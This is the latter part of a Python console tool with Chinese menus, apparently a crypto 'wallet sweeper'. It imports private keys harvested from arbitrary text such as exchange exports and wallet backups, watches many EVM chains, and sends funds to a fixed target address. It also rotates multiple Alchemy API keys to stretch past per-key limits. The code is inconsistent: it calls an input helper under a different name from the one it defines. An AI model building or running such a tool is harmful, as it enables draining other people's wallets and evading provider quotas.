                    
                    # 按网络分组统计
                    network_stats = {}
                    for log in logs:
                        net = log.get('network', 'unknown')
                        if net not in network_stats:
                            network_stats[net] = {'count': 0, 'amount': 0.0}
                        network_stats[net]['count'] += 1
                        network_stats[net]['amount'] += float(log.get('amount', 0))
                    
                    print(f"  📊 总转账: {len(logs)} 笔")
                    print(f"  💰 总金额: {total_amount:.8f} ETH")
                    print(f"  📈 网络分布:")
                    
                    for net_key, stats in network_stats.items():
                        net_name = NETWORK_NAMES.get(net_key, net_key)
                        print(f"    • {net_name}: {stats['count']} 笔, {stats['amount']:.6f} ETH")
                    
                    # 显示最近5笔转账
                    print(f"\n  📝 最近转账记录:")
                    recent_logs = logs[-5:] if len(logs) > 5 else logs
                    for log in recent_logs:
                        time_str = log['timestamp'][:16].replace('T', ' ')
                        network_name = NETWORK_NAMES.get(log['network'], log['network'])
                        amount = log.get('amount', 0)
                        print(f"    • {time_str} | {network_name} | {amount:.6f} ETH")
                else:
                    print("  📭 暂无转账记录")
            except:
                print("  ❌ 转账记录读取失败")
        else:
            print("  📭 暂无转账记录")
        
        # API密钥轮询状态
        print(f"\n{Fore.YELLOW}🔑 API密钥轮询系统:{Style.RESET_ALL}")
        status = get_api_keys_status()
        rate_info = status['rate_info']
        print(f"  📊 总密钥数: {status['total_keys']} 个")
        print(f"  🎯 当前使用: #{status['current_index'] + 1} ({status['current_key']})")
        print(f"  🔄 轮询计数: {status['request_count']}/{status['requests_per_api']} 次")
        print(f"  ⚡ 轮询策略: 每{status['requests_per_api']}次请求自动切换")
        
        # 速率控制详情
        print(f"\n{Fore.CYAN}⚡ 智能速率控制:{Style.RESET_ALL}")
        print(f"  📊 月度限制: {rate_info['total_monthly_limit']:,} CU ({status['total_keys']} API × 3000万)")
        print(f"  📈 已用额度: {MONTHLY_USAGE_TRACKER['used_cu']:,} CU ({rate_info['current_usage_percent']:.1f}%)")
        print(f"  📅 剩余天数: {rate_info['remaining_days']} 天")
        print(f"  🎯 每日目标: {rate_info['daily_target_cu']:,.0f} CU")
        print(f"  ⏱️ 最优间隔: {rate_info['optimal_interval']:.2f} 秒")
        print(f"  🚀 最大速率: {rate_info['max_requests_per_second']:.1f} 请求/秒")
        
        print(f"\n  📋 API密钥列表:")
        for i, key in enumerate(ALCHEMY_API_KEYS):
            status_icon = "🟢" if i == CURRENT_API_KEY_INDEX else "⚪"
            usage_info = f"[{API_REQUEST_COUNT}/{REQUESTS_PER_API}]" if i == CURRENT_API_KEY_INDEX else "[待用]"
            print(f"    {status_icon} API#{i + 1}: {key[:12]}... {usage_info}")
        
        if len(ALCHEMY_API_KEYS) < 5:
            print(f"\n  {Fore.CYAN}💡 添加更多API密钥位置:{Style.RESET_ALL}")
            for j in range(len(ALCHEMY_API_KEYS), min(len(ALCHEMY_API_KEYS) + 3, 10)):
                print(f"    ➕ API#{j + 1}: [可添加新密钥] → 扩容+3000万CU/月")
        
        # 系统配置详情
        print(f"\n{Fore.YELLOW}⚙️ 系统配置详情:{Style.RESET_ALL}")
        print(f"  🎯 目标地址: {TARGET_ADDRESS}")
        print(f"  🔄 监控状态: {'🟢 运行中' if self.monitoring_active else '🔴 已停止'}")
        print(f"  ⚡ 检查间隔: 30秒")
        print(f"  🔀 并发限制: 最多2个钱包，3个网络并发")
        print(f"  💾 数据文件: wallets.json, monitoring_log.json, network_status.json")
    
    def show_help_menu(self):
        """显示帮助菜单 - 完整指南"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}📖 完整使用指南 & 常见问题解答{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}🚀 快速开始指南:{Style.RESET_ALL}")
        print("  1️⃣ 导入私钥 → 粘贴私钥文本 → 双击回车确认")
        print("  2️⃣ 开始监控 → 确认启动 → 系统自动监控转账")
        print("  3️⃣ 查看状态 → 检查钱包、网络、转账状态")
        print("  4️⃣ 使用帮助 → 查看详细操作指南")
        
        print(f"\n{Fore.YELLOW}💡 私钥导入技巧:{Style.RESET_ALL}")
        print("  • 支持任意格式文本，智能提取私钥")
        print("  • 支持批量导入，自动去重验证")
        print("  • 支持0x前缀和无前缀格式")
        print("  • 可以从交易所导出、钱包备份等文本中提取")
        print("  • 输入 'q' 或 'quit' 快速返回主菜单")
        
        print(f"\n{Fore.CYAN}⚡ 性能优化说明:{Style.RESET_ALL}")
        print("  • 并发网络检查: 同时检查多个网络，速度提升3倍")
        print("  • 智能超时控制: 8秒活动检查，5秒余额查询")
        print("  • 网络状态缓存: 记住失败网络，避免重复尝试")
        print("  • 错误智能分类: 区分API限制、网络问题、配置错误")
        print("  • 并发限制控制: 避免触发API速率限制")
        
        print(f"\n{Fore.CYAN}🔑 API密钥轮询系统:{Style.RESET_ALL}")
        status = get_api_keys_status()
        print(f"  • 🔄 智能轮询: 每{status['requests_per_api']}次请求自动切换API密钥")
        print(f"  • 📊 当前配置: {status['total_keys']} 个API密钥")
        print(f"  • 🎯 当前使用: #{status['current_index'] + 1} ({status['current_key']})")
        print(f"  • 🚨 故障转移: API失效时立即切换")
        print(f"  • ➕ 扩展支持: 支持无限个API密钥")
        print(f"  • 💡 添加方法: 在代码ALCHEMY_API_KEYS列表中添加新密钥")
        
        print(f"\n{Fore.YELLOW}⚡ 智能速率控制系统:{Style.RESET_ALL}")
        rate_info = status['rate_info']
        print(f"  • 📊 API限制: 500 CU/秒，3000万 CU/月 (每个API)")
        print(f"  • 🔄 智能扩容: {rate_info['total_api_keys']} API = {rate_info['total_monthly_limit']:,} CU/月")
        print(f"  • ⏱️ 动态间隔: {rate_info['optimal_interval']:.2f} 秒 (基于剩余额度)")
        print(f"  • 📅 时间管理: {rate_info['remaining_days']} 天剩余，每日{rate_info['daily_target_cu']:,.0f} CU")
        print(f"  • 🎯 当前使用: {rate_info['current_usage_percent']:.1f}% ({MONTHLY_USAGE_TRACKER['used_cu']:,} CU)")
        print(f"  • 🚀 最大速率: {rate_info['max_requests_per_second']:.1f} 请求/秒")
        print("  • 📊 重置功能: API管理菜单可重置月度统计")
        
        print(f"\n{Fore.GREEN}🌐 支持的网络 (共{len(SUPPORTED_NETWORKS)}个):{Style.RESET_ALL}")
        print(f"\n  {Fore.CYAN}🔷 Layer 1 主网 ({len([n for n in MAINNET_NETWORKS if n in ['ethereum', 'polygon', 'astar', 'celo', 'bsc', 'metis', 'avalanche', 'gnosis', 'rootstock']])}个):{Style.RESET_ALL}")
        layer1_nets = ['ethereum', 'polygon', 'astar', 'celo', 'bsc', 'metis', 'avalanche', 'gnosis', 'rootstock']
        for net in layer1_nets:
            if net in NETWORK_NAMES:
                print(f"    • {NETWORK_NAMES[net]}")
        
        print(f"\n  {Fore.MAGENTA}🔷 Layer 2 主网 ({len([n for n in MAINNET_NETWORKS if n not in layer1_nets])}个):{Style.RESET_ALL}")
        layer2_nets = [n for n in MAINNET_NETWORKS if n not in layer1_nets]
        for net in layer2_nets:
            print(f"    • {NETWORK_NAMES[net]}")
        
        print(f"\n  {Fore.YELLOW}🧪 测试网 ({len(TESTNET_NETWORKS)}个):{Style.RESET_ALL}")
        for net in TESTNET_NETWORKS:
            print(f"    • {NETWORK_NAMES[net]}")
        
        print(f"\n{Fore.RED}🛡️ 安全提醒:{Style.RESET_ALL}")
        print("  • 私钥以加密形式本地存储，请保护好数据文件")
        print("  • 监控过程需要稳定的网络连接")
        print("  • 建议在VPS或云服务器上24小时运行")
        print("  • 定期备份wallets.json和monitoring_log.json")
        print("  • API密钥会自动轮换使用")
        
        print(f"\n{Fore.YELLOW}🔧 故障排除指南:{Style.RESET_ALL}")
        print("  • API错误403: 系统会自动切换到备用API密钥")
        print("  • 网络连接失败: 检查服务器网络连接")
        print("  • 导入失败: 确认私钥格式为64位十六进制")
        print("  • 监控卡死: 重启程序，系统会自动恢复状态")
        print("  • 转账失败: 检查余额是否足够支付gas费")
        
        print(f"\n{Fore.CYAN}📞 技术支持:{Style.RESET_ALL}")
        print("  • 系统会自动保存所有状态和日志")
        print("  • 重启后会自动恢复钱包和网络配置")
        print("  • 所有操作都有详细的日志记录")
        print("  • 双API密钥确保高可用性")
    
    def api_key_management_menu(self):
        """API密钥管理菜单"""
        while True:
            try:
                os.system('clear' if os.name == 'posix' else 'cls')
            except:
                print("\n" * 50)  # 替代清屏
            
            print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}🔑 API密钥轮询管理系统{Style.RESET_ALL}")
            print(f"{Fore.BLUE}{'='*70}{Style.RESET_ALL}")
            
            status = get_api_keys_status()
            
            print(f"\n{Fore.YELLOW}📊 当前状态:{Style.RESET_ALL}")
            print(f"  📊 总密钥数: {status['total_keys']} 个")
            print(f"  🎯 当前使用: #{status['current_index'] + 1} ({status['current_key']})")
            print(f"  🔄 轮询计数: {status['request_count']}/{status['requests_per_api']} 次")
            print(f"  ⚡ 轮询策略: 每{status['requests_per_api']}次请求自动切换")
            
            print(f"\n{Fore.CYAN}📋 API密钥列表:{Style.RESET_ALL}")
            for i, key in enumerate(ALCHEMY_API_KEYS):
                status_icon = "🟢" if i == CURRENT_API_KEY_INDEX else "⚪"
                usage_info = f"[使用中 {API_REQUEST_COUNT}/{REQUESTS_PER_API}]" if i == CURRENT_API_KEY_INDEX else "[待轮询]"
                print(f"  {status_icon} API#{i + 1}: {key[:20]}... {usage_info}")
            
            # 显示可添加的位置
            print(f"\n{Fore.GREEN}➕ 可添加API密钥位置:{Style.RESET_ALL}")
            for j in range(len(ALCHEMY_API_KEYS), len(ALCHEMY_API_KEYS) + 3):
                print(f"  ➕ API#{j + 1}: [空位，可添加新密钥]")
            
            # 显示速率控制信息
            print(f"\n{Fore.YELLOW}⚡ 速率控制状态:{Style.RESET_ALL}")
            rate_info = status['rate_info']
            print(f"  📊 月度限制: {rate_info['total_monthly_limit']:,} CU")
            print(f"  📈 已用: {MONTHLY_USAGE_TRACKER['used_cu']:,} CU ({rate_info['current_usage_percent']:.1f}%)")
            print(f"  📅 剩余: {rate_info['remaining_days']} 天")
            print(f"  ⏱️ 最优间隔: {rate_info['optimal_interval']:.2f} 秒")
            
            print(f"\n{Fore.YELLOW}🔧 管理功能:{Style.RESET_ALL}")
            print(f"  {Fore.CYAN}1.{Style.RESET_ALL} ➕ 添加新API密钥 (扩容+3000万CU/月)")
            print(f"  {Fore.CYAN}2.{Style.RESET_ALL} 🔄 手动切换API密钥")
            print(f"  {Fore.CYAN}3.{Style.RESET_ALL} ⚙️ 设置轮询频率")
            print(f"  {Fore.CYAN}4.{Style.RESET_ALL} 📊 重置月度使用统计")
            print(f"  {Fore.CYAN}5.{Style.RESET_ALL} 🧪 测试所有API密钥")
            print(f"  {Fore.CYAN}6.{Style.RESET_ALL} 🔙 返回主菜单")
            
            print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
            
            try:
                choice = enhanced_safe_input(f"{Fore.CYAN}请选择功能 (1-6): {Style.RESET_ALL}", "6").strip()
                
                # 验证输入是否为有效数字
                if choice not in ["1", "2", "3", "4", "5", "6"]:
                    print(f"\n{Fore.RED}❌ 无效选择 '{choice}'，请输入 1-6{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}💡 提示: 请输入菜单中显示的数字 (1、2、3、4、5 或 6){Style.RESET_ALL}")
                    time.sleep(3)
                    continue
                
                if choice == "1":
                    self.add_new_api_key()
                elif choice == "2":
                    self.manual_switch_api_key()
                elif choice == "3":
                    self.set_rotation_frequency()
                elif choice == "4":
                    self.reset_monthly_usage()
                elif choice == "5":
                    self.test_all_api_keys()
                elif choice == "6":
                    break
                    
            except KeyboardInterrupt:
                break
    
    def add_new_api_key(self):
        """添加新API密钥"""
        print(f"\n{Fore.CYAN}➕ 添加新API密钥{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 请输入新的Alchemy API密钥{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}格式示例: abcd1234efgh5678ijkl9012mnop3456{Style.RESET_ALL}")
        
        new_key = enhanced_safe_input(f"\n{Fore.CYAN}新API密钥: {Style.RESET_ALL}", "")
        
        if not new_key:
            print(f"{Fore.RED}❌ API密钥不能为空{Style.RESET_ALL}")
        elif len(new_key) < 20:
            print(f"{Fore.RED}❌ API密钥长度不足，请输入完整密钥{Style.RESET_ALL}")
        elif new_key in ALCHEMY_API_KEYS:
            print(f"{Fore.YELLOW}⚠️ 该API密钥已存在{Style.RESET_ALL}")
        else:
            if add_api_key(new_key):
                # 刷新网络配置
                refresh_network_config()
                print(f"{Fore.GREEN}🎉 API密钥添加成功！{Style.RESET_ALL}")
                print(f"{Fore.CYAN}💡 系统现在支持 {len(ALCHEMY_API_KEYS)} 个API密钥轮询{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}❌ 添加失败{Style.RESET_ALL}")
        
        enhanced_safe_input(f"\n{Fore.CYAN}按回车键继续...{Style.RESET_ALL}")
    
    def manual_switch_api_key(self):
        """手动切换API密钥"""
        if len(ALCHEMY_API_KEYS) <= 1:
            print(f"\n{Fore.YELLOW}⚠️ 只有一个API密钥，无法切换{Style.RESET_ALL}")
            enhanced_safe_input(f"\n{Fore.CYAN}按回车键继续...{Style.RESET_ALL}")
            return
        
        old_key = get_current_api_key()
        force_switch_api_key()
        new_key = get_current_api_key()
        
        print(f"\n{Fore.GREEN}🔄 API密钥已切换{Style.RESET_ALL}")
        print(f"  旧密钥: {old_key[:12]}...")
        print(f"  新密钥: {new_key[:12]}...")
        print(f"  当前位置: #{CURRENT_API_KEY_INDEX + 1}/{len(ALCHEMY_API_KEYS)}")
        
        # 刷新网络配置
        refresh_network_config()
        
        enhanced_safe_input(f"\n{Fore.CYAN}按回车键继续...{Style.RESET_ALL}")
    
    def set_rotation_frequency(self):
        """设置轮询频率"""
        global REQUESTS_PER_API
        
        print(f"\n{Fore.CYAN}⚙️ 设置API密钥轮询频率{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}当前频率: 每 {REQUESTS_PER_API} 次请求切换一次API密钥{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}建议范围: 3-10 次（过低可能触发限制，过高可能不够均匀）{Style.RESET_ALL}")
        
        try:
            new_freq = enhanced_safe_input(f"\n{Fore.CYAN}新轮询频率 (回车保持当前): {Style.RESET_ALL}", "")
            
            if new_freq:
                freq = int(new_freq)
                if 1 <= freq <= 50:
                    REQUESTS_PER_API = freq
                    print(f"{Fore.GREEN}✅ 轮询频率已设置为: 每 {REQUESTS_PER_API} 次请求切换{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}❌ 频率必须在 1-50 之间{Style.RESET_ALL}")
            else:
                print(f"{Fore.CYAN}💡 保持当前频率: {REQUESTS_PER_API}{Style.RESET_ALL}")
                
        except ValueError:
            print(f"{Fore.RED}❌ 请输入有效数字{Style.RESET_ALL}")
        
        enhanced_safe_input(f"\n{Fore.CYAN}按回车键继续...{Style.RESET_ALL}")
    
    def test_all_api_keys(self):
        """测试所有API密钥"""
        print(f"\n{Fore.CYAN}🧪 测试所有API密钥...{Style.RESET_ALL}")
        
        for i, api_key in enumerate(ALCHEMY_API_KEYS):
            print(f"\n{Fore.CYAN}[{i + 1}/{len(ALCHEMY_API_KEYS)}] 测试 API#{i + 1}: {api_key[:12]}...{Style.RESET_ALL}")
            
            try:
                # 使用Ethereum主网测试
                test_url = f'https://eth-mainnet.g.alchemy.com/v2/{api_key}'
                web3 = Web3(Web3.HTTPProvider(test_url, request_kwargs={'timeout': 10}))
                
                # 测试基本连接
                block_number = web3.eth.get_block_number()
                print(f"  ✅ 连接成功 - 当前区块: {block_number}")
                
                # 测试余额查询
                balance = web3.eth.get_balance("0x0000000000000000000000000000000000000000")
                print(f"  ✅ 余额查询成功")
                
                print(f"  {Fore.GREEN}🎉 API#{i + 1} 测试通过{Style.RESET_ALL}")
                
            except Exception as e:
                error_msg = str(e)
                if "403" in error_msg or "401" in error_msg:
                    print(f"  {Fore.RED}❌ API#{i + 1} 认证失败 (403/401){Style.RESET_ALL}")
                elif "429" in error_msg:
                    print(f"  {Fore.YELLOW}⚠️ API#{i + 1} 速率限制 (429){Style.RESET_ALL}")
                else:
                    print(f"  {Fore.RED}❌ API#{i + 1} 测试失败: {error_msg[:40]}...{Style.RESET_ALL}")
            
            time.sleep(0.5)  # 避免连续测试触发限制
        
        print(f"\n{Fore.GREEN}🎉 所有API密钥测试完成{Style.RESET_ALL}")
        enhanced_safe_input(f"\n{Fore.CYAN}按回车键继续...{Style.RESET_ALL}")
    
    def reset_monthly_usage(self):
        """重置月度使用统计"""
        print(f"\n{Fore.YELLOW}📊 重置月度使用统计{Style.RESET_ALL}")
        
        current_usage = MONTHLY_USAGE_TRACKER['used_cu']
        rate_info = calculate_optimal_scanning_params()
        
        print(f"当前已用: {current_usage:,} CU ({rate_info['current_usage_percent']:.1f}%)")
        print(f"月度限制: {rate_info['total_monthly_limit']:,} CU")
        print(f"剩余天数: {rate_info['remaining_days']} 天")
        
        confirm = enhanced_safe_input(f"\n{Fore.YELLOW}确认重置月度使用统计? (y/N): {Style.RESET_ALL}", "n").lower()
        
        if confirm in ['y', 'yes']:
            MONTHLY_USAGE_TRACKER['used_cu'] = 0
            MONTHLY_USAGE_TRACKER['last_reset'] = datetime.now().isoformat()
            print(f"{Fore.GREEN}✅ 月度使用统计已重置{Style.RESET_ALL}")
            
            # 重新计算最优参数
            new_rate_info = calculate_optimal_scanning_params()
            print(f"{Fore.CYAN}📊 新的每日目标: {new_rate_info['daily_target_cu']:,.0f} CU{Style.RESET_ALL}")
            print(f"{Fore.CYAN}⏱️ 新的最优间隔: {new_rate_info['optimal_interval']:.2f} 秒{Style.RESET_ALL}")
            print(f"{Fore.CYAN}🚀 最大速率: {new_rate_info['max_requests_per_second']:.1f} 请求/秒{Style.RESET_ALL}")
        else:
            print(f"{Fore.CYAN}取消重置{Style.RESET_ALL}")
        
        enhanced_safe_input(f"\n{Fore.CYAN}按回车键继续...{Style.RESET_ALL}")
    
    def restart_program(self):
        """重启程序 - 清理缓存并重新初始化"""
        print(f"\n{Fore.YELLOW}🔄 程序重启{Style.RESET_ALL}")
        print(f"{Fore.CYAN}这将清理所有缓存并重新初始化系统{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✅ 日志文件将被保留{Style.RESET_ALL}")
        
        confirm = enhanced_safe_input(f"\n{Fore.YELLOW}确认重启程序? (y/N): {Style.RESET_ALL}", "n").lower()
        
        if confirm in ['y', 'yes']:
            print(f"\n{Fore.CYAN}🔄 正在重启...{Style.RESET_ALL}")
            
            # 清理缓存
            smart_cache_cleanup()
            
            # 重新初始化
            try:
                print(f"{Fore.CYAN}🔄 重新初始化网络连接...{Style.RESET_ALL}")
                self.web3_clients.clear()
                self.network_status.clear()
                
                # 重新构建网络配置
                refresh_network_config()
                
                # 重新初始化客户端
                self.initialize_clients()
                
                print(f"{Fore.GREEN}✅ 程序重启完成{Style.RESET_ALL}")
                time.sleep(1)
                
            except Exception as e:
                print(f"{Fore.RED}❌ 重启失败: {e}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}💡 请手动重启程序{Style.RESET_ALL}")
        else:
            print(f"{Fore.CYAN}取消重启{Style.RESET_ALL}")
        
        enhanced_safe_input(f"\n{Fore.CYAN}按回车键继续...{Style.RESET_ALL}")
    
    def main_menu(self):
        """主菜单 - 完全优化的交互体验"""
        while True:
            # 清屏，提供清爽的界面
            try:
                os.system('clear' if os.name == 'posix' else 'cls')
            except:
                print("\n" * 50)  # 替代清屏
            
            print(f"{Fore.BLUE}{'='*80}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}🔐 钱包监控转账系统 v3.0 - 纯RPC网络版{Style.RESET_ALL}")
            print(f"{Fore.BLUE}支持{len(SUPPORTED_NETWORKS)}个EVM兼容链 | 无限API密钥轮询 | 智能优化{Style.RESET_ALL}")
            print(f"{Fore.BLUE}{'='*80}{Style.RESET_ALL}")
            
            self.show_status()
            
            print(f"\n{Fore.YELLOW}📋 功能菜单:{Style.RESET_ALL}")
            print(f"  {Fore.CYAN}1.{Style.RESET_ALL} 📥 导入私钥    {Fore.GREEN}(智能批量识别，支持任意格式){Style.RESET_ALL}")
            print(f"  {Fore.CYAN}2.{Style.RESET_ALL} 🎯 开始监控    {Fore.GREEN}(并发优化，3倍速度提升){Style.RESET_ALL}")
            print(f"  {Fore.CYAN}3.{Style.RESET_ALL} 📊 详细状态    {Fore.GREEN}(完整诊断，网络分析){Style.RESET_ALL}")
            print(f"  {Fore.CYAN}4.{Style.RESET_ALL} 🔑 API密钥管理 {Fore.GREEN}(轮询系统，无限扩展){Style.RESET_ALL}")
            print(f"  {Fore.CYAN}5.{Style.RESET_ALL} 🔄 重启程序    {Fore.GREEN}(清理缓存，重新初始化){Style.RESET_ALL}")
            print(f"  {Fore.CYAN}6.{Style.RESET_ALL} 📖 使用帮助    {Fore.GREEN}(完整指南，故障排除){Style.RESET_ALL}")
            print(f"  {Fore.CYAN}7.{Style.RESET_ALL} 🚪 退出程序    {Fore.GREEN}(安全退出，保存状态){Style.RESET_ALL}")
            
            print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}💡 系统就绪，等待您的选择...{Style.RESET_ALL}")
            
            try:
                choice = enhanced_safe_input(f"{Fore.CYAN}请选择功能 (1-7): {Style.RESET_ALL}", "7").strip()
                
                # 显示用户选择的确认
                print(f"{Fore.GREEN}✅ 您选择了: {choice}{Style.RESET_ALL}")
                
                # 验证输入是否为有效数字
                if choice not in ["1", "2", "3", "4", "5", "6", "7"]:
                    print(f"\n{Fore.RED}❌ 无效选择 '{choice}'，请输入 1-7{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}💡 提示: 请输入菜单中显示的数字 (1、2、3、4、5、6 或 7){Style.RESET_ALL}")
                    time.sleep(3)  # 给用户时间看到提示
                    continue
                
                if choice == "1":
                    self.import_private_keys_menu()
                elif choice == "2":
                    self.start_monitoring_menu()
                elif choice == "3":
                    self.show_detailed_status()
                    enhanced_safe_input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
                elif choice == "4":
                    self.api_key_management_menu()
                elif choice == "5":
                    self.restart_program()
                elif choice == "6":
                    self.show_help_menu()
                    enhanced_safe_input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
                elif choice == "7":
                    print(f"\n{Fore.GREEN}👋 感谢使用钱包监控系统！{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}💾 所有数据已自动保存{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}🔄 下次启动会自动恢复所有配置{Style.RESET_ALL}")
                    break
                    
            except KeyboardInterrupt:
                print(f"\n\n{Fore.GREEN}👋 感谢使用钱包监控系统！{Style.RESET_ALL}")
                print(f"{Fore.CYAN}💾 数据已保存{Style.RESET_ALL}")
                break
            except EOFError:
                print(f"\n{Fore.YELLOW}⚠️ 输入流异常，尝试重新初始化...{Style.RESET_ALL}")
                try:
                    # 尝试重新打开stdin
                    import sys
                    sys.stdin = open('/dev/tty', 'r') if os.path.exists('/dev/tty') else sys.stdin
                    print(f"{Fore.GREEN}✅ 输入流已重新初始化{Style.RESET_ALL}")
                    time.sleep(1)
                    continue
                except:
                    print(f"{Fore.RED}❌ 无法修复输入流，程序退出{Style.RESET_ALL}")
                    break
            except Exception as e:
                print(f"\n{Fore.RED}❌ 系统错误: {e}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}💡 程序将在3秒后继续，如持续出错请重启{Style.RESET_ALL}")
                time.sleep(3)

def smart_cache_cleanup():
    """智能缓存清理 - 保留日志文件"""
    import glob
    
    print(f"{Fore.CYAN}🧹 智能缓存清理中...{Style.RESET_ALL}")
    
    try:
        # 要保留的重要文件
        preserve_files = {
            'wallets.json',
            'monitoring_log.json', 
            'config.json',
            'wallet_monitor.py',
            'install.sh',
            'README.md'
        }
        
        # 清理Python缓存
        cache_patterns = ['__pycache__', '.pytest_cache', '*.pyc', '*.pyo']
        cleaned_count = 0
        
        for pattern in cache_patterns:
            for file_path in glob.glob(pattern, recursive=True):
                try:
                    if os.path.isdir(file_path):
                        import shutil
                        shutil.rmtree(file_path)
                        cleaned_count += 1
                    else:
                        os.remove(file_path)
                        cleaned_count += 1
                except:
                    pass
        
        # 清理临时文件 (保留日志)
        temp_patterns = ['*.tmp', '*.temp', '*.bak', '*.old']
        for pattern in temp_patterns:
            for file_path in glob.glob(pattern):
                if os.path.basename(file_path) not in preserve_files:
                    try:
                        os.remove(file_path)
                        cleaned_count += 1
                    except:
                        pass
        
        if cleaned_count > 0:
            print(f"{Fore.GREEN}✅ 清理了 {cleaned_count} 个缓存文件，日志已保留{Style.RESET_ALL}")
        else:
            print(f"{Fore.CYAN}✅ 缓存已是最新状态{Style.RESET_ALL}")
        
    except Exception as e:
        print(f"{Fore.YELLOW}⚠️ 缓存清理遇到问题: {e}{Style.RESET_ALL}")

def enhanced_enhanced_safe_input(prompt: str, default: str = "") -> str:
    """增强的安全输入函数，处理各种输入异常"""
    import sys
    
    try:
        # 确保输出缓冲区刷新
        sys.stdout.flush()
        sys.stderr.flush()
        
        # 检查stdin是否可用
        if not sys.stdin.isatty():
            print(f"\n{Fore.YELLOW}⚠️ 非交互模式，使用默认值: {default}{Style.RESET_ALL}")
            return default
        
        # 尝试标准输入
        result = input(prompt)
        return result.strip() if result else default
        
    except EOFError:
        print(f"\n{Fore.YELLOW}⚠️ 输入流结束，使用默认值: {default}{Style.RESET_ALL}")
        return default
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}⚠️ 用户中断，使用默认值: {default}{Style.RESET_ALL}")
        return default
    except Exception as e:
        print(f"\n{Fore.RED}❌ 输入错误: {e}，使用默认值: {default}{Style.RESET_ALL}")
        return default

def main():
    """主函数 - 自动启动"""
    try:
        print(f"{Fore.CYAN}🚀 正在启动钱包监控系统...{Style.RESET_ALL}")
        
        # 智能缓存清理
        smart_cache_cleanup()
        
        # 输入流健康检查
        print(f"{Fore.CYAN}🔍 输入流健康检查...{Style.RESET_ALL}")
        try:
            import sys
            if sys.stdin.isatty():
                print(f"{Fore.GREEN}✅ 交互模式正常{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}⚠️ 非交互模式，将使用默认值{Style.RESET_ALL}")
        except:
            print(f"{Fore.YELLOW}⚠️ 输入流检查失败，将使用安全模式{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}✨ 自动进入主菜单模式{Style.RESET_ALL}")
        time.sleep(1)
        
        monitor = WalletMonitor()
        monitor.initialize_clients()
        
        # 自动进入主菜单
        monitor.main_menu()
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}👋 程序已退出{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}❌ 系统启动失败: {e}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 请检查网络连接和依赖安装{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    # 检查命令行参数
    import sys
    
    if len(sys.argv) > 1 and sys.argv[1] == '--safe-mode':
        print(f"{Fore.CYAN}🛡️ 安全模式启动 (非交互)...{Style.RESET_ALL}")
        try:
            smart_cache_cleanup()
            monitor = WalletMonitor()
            monitor.initialize_clients()
            print(f"\n{Fore.GREEN}✅ 系统初始化完成{Style.RESET_ALL}")
            print(f"{Fore.CYAN}💡 请使用正常模式启动: python3 wallet_monitor.py{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}❌ 安全模式启动失败: {e}{Style.RESET_ALL}")
    else:
        # 自动启动主程序
        main()
